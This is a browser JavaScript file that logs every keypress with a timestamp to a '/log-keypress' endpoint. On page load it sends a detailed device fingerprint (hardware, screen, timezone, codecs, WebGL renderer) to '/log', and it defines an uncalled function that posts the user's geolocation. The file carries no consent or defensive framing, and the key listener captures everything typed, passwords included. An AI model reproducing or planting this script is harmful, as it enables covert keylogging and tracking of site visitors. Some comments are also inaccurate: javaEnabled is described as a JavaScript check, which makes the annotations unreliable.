document.addEventListener("DOMContentLoaded", function () {

  // Listen for key press events
  document.addEventListener("keydown", function (event) {
    // Get key information from the event object
    const keyInfo = {
      key: event.key, // Name of the pressed key
      timestamp: new Date().toISOString(), // Time when the key was pressed
    };

    // Send data to the server
    sendKeyInfo(keyInfo);
  });

  // Function to send keyboard data to the server
  function sendKeyInfo(keyInfo) {
    fetch("/log-keypress", {
      method: "POST", // Create an HTTP POST request
      headers: {
        "Content-Type": "application/json", // Indicate that the data is in JSON format
      },
      body: JSON.stringify(keyInfo), // Convert the data to JSON format and send
    })
      .then((response) => response.json()) // Get the response from the server in JSON format
      //.then((data) => console.log("Key info sent successfully:", data))
      .catch((error) => console.error("Error sending key info:", error));
  }
});

// Is touch screen support available?
function checkTouchScreenSupport() {
  var touchSupported = "ontouchstart" in window || navigator.maxTouchPoints > 0;
  return touchSupported; // Return whether touch screen support is available
}

// Video/Audio codec support check
function checkCodecSupport() {
  var video = document.createElement("video"); // Create a video element
  var audio = document.createElement("audio"); // Create an audio element

  var codecs = {
    video: {
      "H.264": 'video/mp4; codecs="avc1.42E01E"',
      VP8: 'video/webm; codecs="vp8, vorbis"',
      VP9: 'video/webm; codecs="vp9"',
      "Ogg Theora": 'video/ogg; codecs="theora"',
    },
    audio: {
      MP3: "audio/mpeg",
      AAC: 'audio/mp4; codecs="mp4a.40.2"',
      Vorbis: 'audio/ogg; codecs="vorbis"',
      Opus: 'audio/webm; codecs="opus"',
      FLAC: "audio/flac",
    },
  };

  var support = { video: {}, audio: {} };

  // Check video codec support
  for (var codec in codecs.video) {
    support.video[codec] = video.canPlayType(codecs.video[codec]) ? true : false;
  }

  // Check audio codec support
  for (var codec in codecs.audio) {
    support.audio[codec] = audio.canPlayType(codecs.audio[codec]) ? true : false;
  }

  //console.log("Supported video codecs:", support.video);
  //console.log("Supported audio codecs:", support.audio);

  return [support.audio, support.video]; // Return codec support status
}

function collectAndSendData() {
  // Collect user information
  const data = {
    platform: navigator.platform, // Platform information
    language: navigator.language, // Language setting
    cookiesEnabled: navigator.cookieEnabled, // Whether cookies are enabled
    screenResolution: `${window.screen.width}x${window.screen.height}`, // Screen resolution
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Time zone
    url: window.location.href, // Current page URL
    number_of_logical_processors: navigator.hardwareConcurrency, // Number of logical processors
    amount_of_memory: navigator.deviceMemory, // Amount of memory (may not be accurate)
    touch_screen_support: checkTouchScreenSupport(), // Touch screen support
    codec_support: checkCodecSupport(), // Codec support

    color_depth: window.screen.colorDepth, // Color depth

    //network_status: navigator.connection.effectiveType, // -Error -Network connection status

    javascript_engine: navigator.javaEnabled(), // Is JavaScript enabled?
    api_perf: performance.now(), // Measure browser performance
    navigation_timing: performance.timing, // Page load timing information

    inner_width: window.innerWidth, // Window width
    inner_height: window.innerHeight, // Window height

    webGL_info: getWebGLInfo(), // WebGL information

  };

  // Convert data to JSON format
  const jsonData = JSON.stringify(data);

  // Create a POST request and send the data
  fetch("/log", {
    method: "POST", // Make an HTTP POST request
    headers: {
      "Content-Type": "application/json", // Indicate that the data is JSON
    },
    body: jsonData, // Send JSON data
  })
    .then((response) => {
      if (response.ok) {
        //console.log("Data successfully sent."); // If successful
      } else {
        //console.error("Failed to send data."); // If there is an error
      }
    })
    .catch((error) => console.error("Error:", error)); // Catch and log the error
}

// Function to log geolocation data
function getLocation () {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const geoData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        };
        // Convert geolocation data to JSON format
        const geoJsonData = JSON.stringify(geoData);

        // Send geolocation data using POST request
        fetch("/log-geolocation", {
          method: "POST", // HTTP POST request
          headers: {
            "Content-Type": "application/json" // Specify JSON content type
          },
          body: geoJsonData // Send JSON data
        })
          .then((response) => {
            if (response.ok) {
              // Geolocation data successfully sent
            } else {
              console.error("Failed to send geo data."); // Handle error
            }
          })
          .catch((error) => console.error("Error:", error)); // Handle fetch error
      },
      (error) => {
        console.error("Error getting geolocation:", error); // Handle geolocation error
      }
    );
  } else {
    //console.error("Geolocation is not supported by this browser."); // Handle no geolocation support
  }
}

function getWebGLInfo() {
  const canvas = document.createElement("canvas"); // Create a canvas element
  const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl"); // Get WebGL context

  if (gl) {
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info"); // Get debug info extension
    if (debugInfo) {
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); // Get renderer info
      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL); // Get vendor info
      return {
        Renderer: renderer,
        Vendor: vendor,
      };
    } else {
      //console.log("WEBGL_debug_renderer_info extension not supported"); // Message if not supported
      return {
        Renderer: "Not supported",
        Vendor: "Not supported",
      };
    }
  } else {
    //console.log("WebGL not supported"); // Message if WebGL is not supported
    return JSON.stringify({
      Renderer: "WebGL not supported",
      Vendor: "WebGL not supported",
    });
  }
}

// Execute function when the page loads
window.onload = collectAndSendData;
